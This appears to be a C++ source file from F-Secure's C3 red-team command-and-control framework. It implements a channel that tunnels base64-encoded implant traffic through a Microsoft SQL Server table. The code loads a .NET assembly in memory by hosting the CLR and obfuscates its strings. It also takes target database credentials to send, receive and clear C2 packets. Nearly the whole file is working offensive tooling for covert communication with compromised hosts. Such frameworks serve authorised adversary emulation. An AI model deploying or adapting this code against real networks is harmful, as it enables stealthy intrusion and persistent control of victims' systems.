#include "StdAfx.h"
#include "MSSQL.h"
#include <filesystem>
#include <metahost.h>
#include "Common/FSecure/Crypto/Base64.h"
#if defined (__clang__)
#warning("Compilation of Grunt peripheral is only supported with MSVC")
#elif defined (_MSC_VER)
#endif
//For loading of CLR
#pragma comment(lib, "mscoree.lib")
#import "mscorlib.tlb" raw_interfaces_only high_property_prefixes("_get", "_put", "_putref") rename("ReportEvent", "InteropServices_ReportEvent") auto_rename
using namespace mscorlib;

namespace FSecure::C3::Interfaces::Channels
{
    //Variable that holds the pointer to the .NET runtime we've loaded.
    static _TypePtr spType;
    static _TypePtr RuntimeV4Host()
    {
        //Do not remove the comment below here, otherwise post-build may experience issues.
        //AssemblyDLL Goes Here
        unsigned char assemblyDLL[] = { 0x00,0x00,0x00 };


        PBYTE pbAssembly = assemblyDLL;
        //$Bytes.Length
        SIZE_T assemblyLen = 7680;
        HANDLE hHeap = GetProcessHeap();
        HRESULT hr;
        ICLRMetaHost* pMetaHost = NULL;
        ICLRRuntimeInfo* pRuntimeInfo = NULL;
        ICorRuntimeHost* pCorRuntimeHost = NULL;
        IUnknownPtr spAppDomainThunk = NULL;
        _AppDomainPtr spDefaultAppDomain = NULL;
        _AssemblyPtr spAssembly = NULL;
        _TypePtr spType = NULL;
        _variant_t vtEmpty = NULL;
        _variant_t output;
        BSTR bstrStaticMethodName = NULL;
        BSTR bstrClassName = NULL;
        SAFEARRAY* psaTypesArray = NULL;
        SAFEARRAY* psaStaticMethodArgs = NULL;
        SAFEARRAY* arr = NULL;
        PBYTE pbAssemblyIndex = NULL;
        PBYTE pbDataIndex = NULL;
        long index = 0;
        PWSTR wcs = NULL;

        hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_PPV_ARGS(&pMetaHost));
        if (FAILED(hr))
        {
            goto Cleanup;
        }


        //Load .net 4.0 runtime
        hr = pMetaHost->GetRuntime(OBF(L"v4.0.30319"), IID_PPV_ARGS(&pRuntimeInfo));
        if (FAILED(hr))
        {
            //Attempt to load .NET 3.5 if we couldn't load 4.0
            hr = pMetaHost->GetRuntime(OBF(L"v2.0.50727"), IID_PPV_ARGS(&pRuntimeInfo));
            if (FAILED(hr)) {
                //Cleanup no supported runtimes
                goto Cleanup;
            }

        }

        BOOL fLoadable;

        //Check if the runtime is loadable
        hr = pRuntimeInfo->IsLoadable(&fLoadable);
        if (FAILED(hr))
        {
            goto Cleanup;
        }

        if (!fLoadable)
        {
            goto Cleanup;
        }

        hr = pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_PPV_ARGS(&pCorRuntimeHost));
        if (FAILED(hr))
        {
            goto Cleanup;
        }

        hr = pCorRuntimeHost->Start();
        if (FAILED(hr))
        {
            goto Cleanup;
        }

        hr = pCorRuntimeHost->CreateDomain(OBF(L"AppDomain"), NULL, &spAppDomainThunk);
        if (FAILED(hr))
        {
            goto Cleanup;
        }

        hr = spAppDomainThunk->QueryInterface(IID_PPV_ARGS(&spDefaultAppDomain));
        if (FAILED(hr))
        {
            goto Cleanup;
        }

        SAFEARRAYBOUND bounds[1];
        bounds[0].cElements = static_cast<ULONG>(assemblyLen);
        bounds[0].lLbound = 0;

        arr = SafeArrayCreate(VT_UI1, 1, bounds);
        SafeArrayLock(arr);

        pbAssemblyIndex = pbAssembly;
        pbDataIndex = (PBYTE)arr->pvData;

        while (static_cast<SIZE_T>(pbAssemblyIndex - pbAssembly) < assemblyLen)
            *(BYTE*)pbDataIndex++ = *(BYTE*)pbAssemblyIndex++;

        SafeArrayUnlock(arr);
        hr = spDefaultAppDomain->Load_3(arr, &spAssembly);


        if (FAILED(hr) || spAssembly == NULL)
        {
            goto Cleanup;
        }

        hr = spAssembly->GetTypes(&psaTypesArray);
        LONG* pVals;
        hr = SafeArrayAccessData(psaTypesArray, (void**)&pVals); // direct access to SA memory

        if (FAILED(hr))
        {
            goto Cleanup;
        }


        index = 0;
        //This gets the first value from the psaTypesArray
        //This returns Namespace.Class
        //In the case of the example DLL it returns C3Sharp.Class1
        hr = SafeArrayGetElement(psaTypesArray, &index, &spType);
        if (FAILED(hr) || spType == NULL)
        {
            goto Cleanup;
        }

        return spType;

        //Loader Failed, start cleanup.
    Cleanup:
        if (spDefaultAppDomain)
        {
            pCorRuntimeHost->UnloadDomain(spDefaultAppDomain);
            spDefaultAppDomain = NULL;
        }
        if (pMetaHost)
        {
            pMetaHost->Release();
            pMetaHost = NULL;
        }
        if (pRuntimeInfo)
        {
            pRuntimeInfo->Release();
            pRuntimeInfo = NULL;
        }
        if (pCorRuntimeHost)
        {
            pCorRuntimeHost->Release();
            pCorRuntimeHost = NULL;
        }
        if (psaTypesArray)
        {
            SafeArrayDestroy(psaTypesArray);
            psaTypesArray = NULL;
        }
        if (psaStaticMethodArgs)
        {
            SafeArrayDestroy(psaStaticMethodArgs);
            psaStaticMethodArgs = NULL;
        }
        SysFreeString(bstrClassName);
        SysFreeString(bstrStaticMethodName);

        return NULL;
    }
    static std::string WidestringToString(std::wstring const& wstr)
    {
        if (wstr.empty())
            return {};
        int size = WideCharToMultiByte(CP_UTF8, WC_ERR_INVALID_CHARS, &wstr[0], static_cast<int>(wstr.size()), NULL, 0, NULL, NULL);
        std::string ret(size, 0);
        WideCharToMultiByte(CP_UTF8, WC_ERR_INVALID_CHARS, &wstr[0], static_cast<int>(wstr.size()), &ret[0], size, NULL, NULL);
        return ret;
    }
    static bool PrepareDatabase(std::string servername, std::string databasename, std::string tablename, std::string username, std::string password) {
        HRESULT hr;
        SAFEARRAY* psaStaticMethodArgs = NULL;
        _variant_t output;
        _variant_t vtPSEntryPointReturnVal;
        _variant_t vtEmpty;
        _variant_t vOut;
        size_t bytes;
        BSTR bstrStaticMethodName = SysAllocString(L"PrepareTable");

        //Create an array with space for 7 values (This will be passed to our OnSendToChannel function in the .NET DLL
        psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 5);

        //Create a std::vector of _variant_t containing the array of values we're going to pass to the .NET DLL
        std::vector<_variant_t> vargs = { _variant_t(servername.c_str()),_variant_t(databasename.c_str()),_variant_t(tablename.c_str()),_variant_t(username.c_str()),_variant_t(password.c_str()) };

        //Place each variable pointer outlined above into our array
        for (auto i = 0; i < vargs.size(); i++) {
            LONG index = i;
            hr = SafeArrayPutElement(psaStaticMethodArgs, &index, &vargs[i]);
            if (FAILED(hr)) {
                bytes = static_cast<size_t>(0);
            }
        }

        //Call the function.
        hr = spType->InvokeMember_3(bstrStaticMethodName, static_cast<BindingFlags>(
            BindingFlags_InvokeMethod | BindingFlags_Static | BindingFlags_Public),
            NULL, vtEmpty, psaStaticMethodArgs, &output);

        if (FAILED(hr))
        {
            return false;
        }
        return true;
    }
    MSSQL::MSSQL(FSecure::ByteView bv)
        : m_InboundDirectionName{ bv.Read<std::string>() }
        , m_OutboundDirectionName{ bv.Read<std::string>() }
        , servername{ bv.Read<std::string>() }
        , databasename{ bv.Read<std::string>() }
        , tablename{ bv.Read<std::string>() }
        , username{ bv.Read<std::string>() }
        , password{ bv.Read<std::string>() }
    {

        //Load the RunTime and store it as a variable
        spType = RuntimeV4Host();
        bool prepared = PrepareDatabase(servername, databasename, tablename, username, password);
        if (!prepared) {
            Log({ OBF("Failed Calling PrepareDatabase Method. Communications will not work."), LogMessage::Severity::Error });
        }

    }

    size_t MSSQL::OnSendToChannel(FSecure::ByteView packet)
    {
        std::string b64packet = cppcodec::base64_rfc4648::encode(packet.data(), packet.size());
        //int byteswritten = ExecuteSend(spType, b64packet, servername, databasename, tablename, username, password, m_OutboundDirectionName);
        HRESULT hr;
        SAFEARRAY* psaStaticMethodArgs = NULL;
        _variant_t output;
        _variant_t vtPSEntryPointReturnVal;
        _variant_t vtEmpty;
        _variant_t vOut;
        size_t bytes;
        BSTR bstrStaticMethodName = SysAllocString(L"OnSendToChannel");

        //Create an array with space for 7 values (This will be passed to our OnSendToChannel function in the .NET DLL
        psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 7);

        //Create a std::vector of _variant_t containing the array of values we're going to pass to the .NET DLL
        std::vector<_variant_t> vargs = { _variant_t(b64packet.c_str()),  _variant_t(servername.c_str()),_variant_t(databasename.c_str()),_variant_t(tablename.c_str()),_variant_t(username.c_str()),_variant_t(password.c_str()), _variant_t(m_OutboundDirectionName.c_str()) };

        //Place each variable pointer outlined above into our array
        for (auto i = 0; i < vargs.size(); i++) {
            LONG index = i;
            hr = SafeArrayPutElement(psaStaticMethodArgs, &index, &vargs[i]);
            if (FAILED(hr)) {
                Log({ OBF("Failed Calling OnSendToChannel Method. Returning 0. (Failed to allocate array.)"), LogMessage::Severity::Error });
                bytes = static_cast<size_t>(0);
            }
        }

        //Call the function.
        hr = spType->InvokeMember_3(bstrStaticMethodName, static_cast<BindingFlags>(
            BindingFlags_InvokeMethod | BindingFlags_Static | BindingFlags_Public),
            NULL, vtEmpty, psaStaticMethodArgs, &output);

        if (FAILED(hr))
        {
            Log({ OBF("Failed Calling OnSendToChannel Method. Returning 0. (InvokeMember_3 failed.)"), LogMessage::Severity::Error });
            bytes = static_cast<size_t>(0);
        }
        if (S_OK == VariantChangeType(&vOut, &output, 0, VT_I4))
        {
            bytes = static_cast<size_t>(vOut.intVal);
        }
        return bytes;
    }
    FSecure::ByteVector MSSQL::OnReceiveFromChannel()
    {
        HRESULT hr;
        SAFEARRAY* psaStaticMethodArgs = NULL;
        _variant_t output;
        _variant_t vtPSEntryPointReturnVal;
        _variant_t vtEmpty;
        BSTR bstrStaticMethodName = SysAllocString(L"OnReceiveFromChannel");


        //Create an array with space for 6 values (This will be passed to our OnReceiveFromChannel function in the .NET DLL
        psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 6);

        //Create a std::vector of _variant_t containing the array of values we're going to pass to the .NET DLL
        //In this example our Looks like public static string OnReceiveFromChannel(string servername, string databasename, string tablename, string username, string password, string inboundID)
        //So it will need to have each parameter passed to it. servername, databasename, tablename, username, password, inboundID
        std::vector<_variant_t> vargs = { _variant_t(servername.c_str()),_variant_t(databasename.c_str()),_variant_t(tablename.c_str()),_variant_t(username.c_str()),_variant_t(password.c_str()), _variant_t(m_InboundDirectionName.c_str()) };

        //Place each variable pointer outlined above into our array
        for (auto i = 0; i < vargs.size(); i++) {
            LONG index = i;
            hr = SafeArrayPutElement(psaStaticMethodArgs, &index, &vargs[i]);
            if (FAILED(hr)) {
                Log({ OBF("Failed Calling ClearTable Method. (Failed to allocate array)"), LogMessage::Severity::Error });
                output = L"";
            }
        }

        //Call the function.
        hr = spType->InvokeMember_3(bstrStaticMethodName, static_cast<BindingFlags>(
            BindingFlags_InvokeMethod | BindingFlags_Static | BindingFlags_Public),
            NULL, vtEmpty, psaStaticMethodArgs, &output);

        if (FAILED(hr))
        {
            Log({ OBF("Failed Calling OnSendToChannel Method. (InvokeMember_3 failed)"), LogMessage::Severity::Error });
            output = L"";
        }

        //std::wstring finaloutput = std::wstring(output.bstrVal);?
        auto r = cppcodec::base64_rfc4648::decode<ByteVector>(WidestringToString(std::wstring(output.bstrVal)));
        return FSecure::ByteVector{ r };
    }
    ByteVector MSSQL::OnRunCommand(ByteView command)
    {

        auto commandCopy = command;
        switch (command.Read<uint16_t>())
        {
        case 0:
            return ClearTable();
        default:
            return {};
        }
    }
    ByteVector MSSQL::ClearTable()
    {
        HRESULT hr;
        SAFEARRAY* psaStaticMethodArgs = NULL;
        _variant_t output;
        _variant_t vtPSEntryPointReturnVal;
        _variant_t vtEmpty;
        _variant_t vOut;
        size_t bytes;
        BSTR bstrStaticMethodName = SysAllocString(L"ClearTable");

        //Create an array with space for 7 values (This will be passed to our OnSendToChannel function in the .NET DLL
        psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 5);

        //Create a std::vector of _variant_t containing the array of values we're going to pass to the .NET DLL
        std::vector<_variant_t> vargs = { _variant_t(servername.c_str()),_variant_t(databasename.c_str()),_variant_t(tablename.c_str()),_variant_t(username.c_str()),_variant_t(password.c_str()) };

        //Place each variable pointer outlined above into our array
        for (auto i = 0; i < vargs.size(); i++) {
            LONG index = i;
            hr = SafeArrayPutElement(psaStaticMethodArgs, &index, &vargs[i]);
            if (FAILED(hr)) {
                Log({ OBF("Failed Calling ClearTable Method. (Could not allocate array)"), LogMessage::Severity::Error });
                bytes = static_cast<size_t>(0);
            }
        }

        //Call the function.
        hr = spType->InvokeMember_3(bstrStaticMethodName, static_cast<BindingFlags>(
            BindingFlags_InvokeMethod | BindingFlags_Static | BindingFlags_Public),
            NULL, vtEmpty, psaStaticMethodArgs, &output);

        if (FAILED(hr))
        {
            Log({ OBF("Failed Calling ClearTable Method. (InvokeMember_3 failed.)"), LogMessage::Severity::Error });
            return {};
        }
        Log({ OBF("Database Cleared Successfully."), LogMessage::Severity::DebugInformation });
        return {};
    }
    const char* MSSQL::GetCapability()
    {
        return R"(
            {
                "create": {
		            "arguments":
		            [
			            [
				            {
					            "type": "string",
					            "name": "Input ID",
					            "min": 4,
					            "randomize": true,
					            "description": "Used to distinguish packets for the channel"
				            },
				            {
					            "type": "string",
					            "name": "Output ID",
					            "min": 4,
					            "randomize": true,
					            "description": "Used to distinguish packets from the channel"
				            }
			            ],
			            {
				            "type": "string",
				            "name": "Server Name",
				            "description": "The Host of the target database"
			            },
			            {
				            "type": "string",
				            "name": "Database Name",
				            "description": "The name of the database to write to"
			            },
			            {
				            "type": "string",
				            "name": "Table Name",
				            "description": "The name of the table to write to"
			            },
			            {
				            "type": "string",
				            "name": "Username",
				            "description": "The username used to authenticate to the database. If using a domain user put in the format DOMAIN\\Username"
			            },
			            {
				            "type": "string",
				            "name": "Password",
				            "description": "The password used to authenticate to the database"
			            }
		            ]
                },
                "commands": [
                    {
                        "name": "Clear Database",
                        "description": "Clears the contents of the database.",
                        "id": 0,
                        "arguments": [
                        ]
                    }
                ]
            }
        )";
    }
}
